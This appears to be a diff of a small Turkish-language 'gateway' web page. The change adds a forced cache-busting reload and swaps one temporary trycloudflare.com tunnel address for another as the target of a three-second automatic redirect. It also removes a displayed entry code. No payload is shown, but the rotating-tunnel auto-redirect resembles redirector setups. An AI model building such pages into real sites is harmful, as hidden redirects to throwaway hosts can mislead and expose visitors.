@@ -3,20 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <title>Atlas Secure Gateway</title>
+    <script>
+        // Linkin sonunda atlas_sync yoksa (herkes icin) sayfayi zorla yenile
+        if(!window.location.search.includes('atlas_sync=')) {
+            window.location.replace(window.location.pathname + "?atlas_sync=" + Date.now());
+        }
+    </script>
 </head>
-<body style="background:#000; color:#00ff00; font-family:monospace; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; margin:0; text-align:center;">
-    <div style="border:1px solid #00ff00; padding:30px;">
-        <h2>SISTEM AKTIF</h2>
-        <p style="color:#555;">Giris Kodu: 679254</p>
-        <div id="timer" style="font-size:40px;">3</div>
+<body style="background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; text-align:center;">
+    <div style="border:1px solid #0f0; padding:20px;">
+        <p>BAGLANTI TAZELENIYOR...</p>
+        <p id="timer" style="font-size:30px;">3</p>
+        <p style="font-size:10px; opacity:0.3;">SUNUCU_TS: 1769626296</p>
     </div>
     <script>
         let c = 3;
         setInterval(() => {
             c--;
             document.getElementById('timer').innerText = c;
-            if(c <= 0) window.location.replace("https://mega-simulations-execute-found.trycloudflare.com");
+            if(c <= 0) window.location.replace("https://sun-luck-adapter-minerals.trycloudflare.com");
         }, 1000);
     </script>
 </body>
